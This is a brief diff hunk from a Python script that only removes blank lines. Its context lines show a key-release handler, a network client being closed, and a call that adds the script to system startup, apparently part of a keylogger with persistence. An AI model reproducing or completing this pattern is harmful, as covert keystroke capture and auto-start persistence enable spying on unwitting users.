@@ -32,8 +32,6 @@ def on_release(key):
         istemci.close()
         return False
 
-
-
 if __name__ == '__main__':
     script_path = os.path.abspath(__file__)
     add_to_startup(script_path)
